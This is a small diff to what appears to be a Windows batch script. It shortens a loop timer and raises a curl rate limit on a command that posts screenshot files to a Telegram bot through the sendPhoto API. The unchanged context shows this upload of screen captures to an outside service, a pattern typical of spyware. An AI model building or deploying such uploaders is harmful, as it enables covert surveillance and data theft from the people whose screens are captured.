@@ -126,7 +126,7 @@ echo 1 > "%temp%\run_once1.flag"
 
 
 
-timeout /t 600 /nobreak
+timeout /t 300 /nobreak
 
 
 :again
@@ -163,7 +163,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
      -F "caption=%CAPTION_MyScrn%" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
-     --limit-rate 50K
+     --limit-rate 80K
 
 ::goto GOGO2
 
